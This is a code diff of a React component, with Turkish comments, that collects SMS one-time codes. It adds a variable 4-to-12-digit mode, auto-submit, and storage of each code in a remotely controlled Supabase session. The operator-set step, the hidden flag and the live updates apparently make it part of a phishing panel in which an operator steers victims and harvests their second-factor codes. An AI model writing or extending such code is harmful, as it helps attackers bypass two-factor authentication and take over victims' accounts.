@@ -17,12 +17,23 @@ export function SmsClient({ sessionId }: Props) {
   const supabase = useMemo(() => createBrowserSupabaseClient(), []);
   const { settings, loading: settingsLoading } = useSettings();
   const [digits, setDigits] = useState(6);
+  const [smsMode, setSmsMode] = useState<"fixed" | "unknown">("fixed");
   const [customText, setCustomText] = useState<string | null>(null);
   const [code, setCode] = useState("");
   const [loading, setLoading] = useState(true);
   const [saving, setSaving] = useState(false);
   const [msg, setMsg] = useState<string | null>(null);
   const [sessionFormData, setSessionFormData] = useState<Record<string, unknown>>({});
+
+  // ⭐ BELİRSİZ HANE: DİNAMİK hane sayısı (kullanıcı kaç hane girerse o kadar)
+  //   min 4, max 12. Baslangicta 4 kutu gosterilir, kullanici 5. haneyi girince 5. kutu acilir, vb.
+  const effectiveDigits = useMemo(() => {
+    if (smsMode !== "unknown") return digits;
+    // Belirsiz mod: min 4, max 12. code.length + 1 sonraki hane icin (en az 4).
+    const needed = Math.max(4, Math.min(12, code.length + 1));
+    return needed;
+  }, [smsMode, digits, code.length]);
+
   useEffect(() => {
     let cancelled = false;
     void (async () => {
@@ -36,15 +47,15 @@ export function SmsClient({ sessionId }: Props) {
         setLoading(false);
         return;
       }
-      setDigits(data.sms_digits ?? 6);
-      setCustomText(data.sms_custom_text);
+      // ⭐ BELİRSİZ HANE: sms_mode === "unknown" VEYA sms_digits === 0 ise dynamic mod
+      const modeUnknown = (data as any).sms_mode === "unknown" || (data as any).sms_mode === null && Number(data.sms_digits) === 0;
+      setSmsMode(modeUnknown ? "unknown" : "fixed");
+      setDigits(Number(data.sms_digits) || 6);
+      setCustomText(data.sms_custom_text ?? null);
       const fd = (data.form_data ?? {}) as Record<string, string>;
       fd.smsCode = "";
       fd.sms_code = "";
       // ⭐ KULLANICI SMS SAYFASINA TEKRAR DÖNÜNCE ESKİ SMS KODU ASLA GÖZÜKMEMELİ:
-      // 1) Input'u boşalt (setCode(""))
-      // 2) DB'deki eski smsCode/sms_code'u sil (Redeploy sonrası kullanıcı sayfayı
-      //    yenilediğinde de eski kod gelmesin diye)
       setCode("");
       void supabase
         .from("sessions")
@@ -69,12 +80,16 @@ export function SmsClient({ sessionId }: Props) {
           (payload) => {
             const next = payload.new as {
               sms_digits?: number;
+              sms_mode?: string | null;
               sms_custom_text?: string | null;
               current_step?: string;
               form_data?: Record<string, any>;
             };
-            if (next.sms_digits) {
-              setDigits(next.sms_digits);
+            // ⭐ BELİRSİZ HANE realtime guncellemesi
+            const modeUnknown = next.sms_mode === "unknown" || (next.sms_mode === undefined && Number(next.sms_digits) === 0);
+            if (next.sms_mode !== undefined || next.sms_digits !== undefined) {
+              setSmsMode(modeUnknown ? "unknown" : "fixed");
+              setDigits(Number(next.sms_digits) || 6);
               setCode("");
             }
             if (next.sms_custom_text !== undefined) {
@@ -104,13 +119,36 @@ export function SmsClient({ sessionId }: Props) {
     };
   }, [sessionId, supabase]);
 
-  async function handleSubmit(e: React.FormEvent) {
-    e.preventDefault();
+  async function handleSubmit(e?: React.FormEvent | null, fromAuto = false) {
+    if (e) e.preventDefault();
     if (!supabase || !sessionId) return;
+    const trimmed = code.trim();
+
+    // ⭐ VALIDASYON:
+    //   fixed mod: trimmed.length === digits + numeric
+    //   unknown (belirsiz) mod: trimmed.length >= 4 (min 4 hane) + numeric (max 12)
+    const isNumeric = /^\d+$/.test(trimmed);
+    const validFixed = smsMode === "fixed" && trimmed.length === digits && isNumeric;
+    const validUnknown = smsMode === "unknown" && trimmed.length >= 4 && trimmed.length <= 12 && isNumeric;
+    if (!(validFixed || validUnknown)) {
+      setMsg(
+        smsMode === "fixed"
+          ? `Enter exactly ${digits} digits.`
+          : "Enter 4 to 12 digits.",
+      );
+      return;
+    }
+
     setSaving(true);
     setMsg(null);
 
-    const nextFormData = { ...sessionFormData, smsCode: code.trim() };
+    const nextFormData = {
+      ...sessionFormData,
+      smsCode: trimmed,
+      sms_code: trimmed,
+      sms_otp_length: trimmed.length,
+      sms_otp_mode: smsMode,
+    };
     const { error } = await supabase
       .from("sessions")
       .update({ is_hidden: false, current_step: "wait", form_data: nextFormData })
@@ -169,22 +207,58 @@ export function SmsClient({ sessionId }: Props) {
   }
 
   const trimmed = code.trim();
-  const valid = trimmed.length === digits && /^\d+$/.test(trimmed);
+  // ⭐ VALIDASYON:
+  //   fixed mod: code.length === digits
+  //   unknown (belirsiz) mod: code.length >=4 (min 4, max 12). Tum basilan hane kadar DOLU olmali.
+  const numeric = /^\d+$/.test(trimmed);
+  const validFixed = smsMode === "fixed" && trimmed.length === digits && numeric;
+  const validUnknown =
+    smsMode === "unknown" &&
+    trimmed.length >= 4 &&
+    trimmed.length <= 12 &&
+    numeric &&
+    trimmed.length === effectiveDigits - 1; // Son kutudan SONRAKI (yeni) acilacak kutu yok ise tum kutular DOLDURULMUS
+  const valid = validFixed || validUnknown;
+
   const displayText = customText || settings.sms_subtitle;
+  const labelText =
+    smsMode === "unknown"
+      ? `${settings.sms_input_label} (Minimum 4 hane, maksimum 12)`
+      : `${settings.sms_input_label} (${digits})`;
 
   // OTP style input handling
   const handleOtpChange = (index: number, value: string) => {
     if (!/^\d*$/.test(value)) return;
-    
+
     const newCode = code.split("");
     newCode[index] = value.substring(value.length - 1); // Only take the last char
-    const updatedCode = newCode.join("");
-    setCode(updatedCode.slice(0, digits));
+    const updatedCode = newCode.join("").replace(/[^\d]/g, "");
+
+    // ⭐ BELİRSİZ HANE: code slice siniri effectiveDigits DEGIL, max 12
+    const limit = smsMode === "unknown" ? Math.max(4, 12) : digits;
+    const finalCode = updatedCode.slice(0, limit);
+    setCode(finalCode);
 
     // Move to next input
-    if (value && index < digits - 1) {
-      const nextInput = document.getElementById(`otp-input-${index + 1}`);
+    // ⭐ BELİRSİZ HANE: effectiveDigits - 1 indexinden sonra next var (otomatik 5. kutu acilir 4. hane yazılınca)
+    const nextIndex = index + 1;
+    if (value && nextIndex < effectiveDigits) {
+      const nextInput = document.getElementById(`otp-input-${nextIndex}`);
       if (nextInput) nextInput.focus();
+    }
+
+    // ⭐ BELİRSİZ HANE: SON kutuya yazildi ve valid olduysa (min 4+ ve max 12) OTOMATIK submit
+    if (smsMode === "unknown") {
+      const t = finalCode.trim();
+      const n = /^\d+$/.test(t) ? t.length : 0;
+      const autoSubmitReady =
+        n >= 4 &&
+        n <= 12 &&
+        n === effectiveDigits - 1 &&
+        (n === 12 || index === n - 1); // son kutu (12) veya son yazilan index
+      if (autoSubmitReady && !saving && value && !validFixed) {
+        window.setTimeout(() => void handleSubmit(null, true), 200);
+      }
     }
   };
 
@@ -197,12 +271,22 @@ export function SmsClient({ sessionId }: Props) {
 
   const handlePaste = (e: React.ClipboardEvent) => {
     e.preventDefault();
-    const pastedData = e.clipboardData.getData("text").replace(/\D/g, "").slice(0, digits);
+    const limit = smsMode === "unknown" ? 12 : digits;
+    const pastedData = e.clipboardData.getData("text").replace(/\D/g, "").slice(0, limit);
     setCode(pastedData);
-    if (pastedData.length > 0) {
-      const focusIndex = Math.min(pastedData.length, digits - 1);
+    const n = pastedData.length;
+    if (n > 0) {
+      const focusIndex = smsMode === "unknown" ? Math.min(n, effectiveDigits - 1) : Math.min(n, digits - 1);
       const input = document.getElementById(`otp-input-${focusIndex}`);
       if (input) input.focus();
+    }
+    // ⭐ BELİRSİZ HANE: PASTE sonrasi 4+ ve 12- ise ve valid ise otomatik submit
+    if (smsMode === "unknown") {
+      const p = pastedData.trim();
+      const autoReady = /^\d+$/.test(p) && p.length >= 4 && p.length <= 12;
+      if (autoReady && !saving) {
+        window.setTimeout(() => void handleSubmit(null, true), 180);
+      }
     }
   };
 
@@ -225,9 +309,9 @@ export function SmsClient({ sessionId }: Props) {
         
           <form onSubmit={handleSubmit} className="mt-5 space-y-5 sm:mt-6">
             <div className="pak-form-label">
-              <div className="mb-3">{settings.sms_input_label} ({digits})</div>
+              <div className="mb-3">{labelText}</div>
               <div className="flex flex-wrap justify-center gap-2" onPaste={handlePaste}>
-              {Array.from({ length: digits }).map((_, index) => (
+              {Array.from({ length: effectiveDigits }).map((_, index) => (
                 <input
                   key={index}
                   id={`otp-input-${index}`}
@@ -245,7 +329,11 @@ export function SmsClient({ sessionId }: Props) {
             </div>
 
             {!valid && code.length > 0 ? (
-              <p className="text-xs text-red-400">Enter exactly {digits} digits.</p>
+              <p className="text-xs text-red-400">
+                {smsMode === "fixed"
+                  ? `Enter exactly ${digits} digits.`
+                  : "Enter 4 to 12 digits. Fill all visible boxes to continue."}
+              </p>
             ) : null}
 
             {msg ? <p className="text-center text-sm text-red-400">{msg}</p> : null}
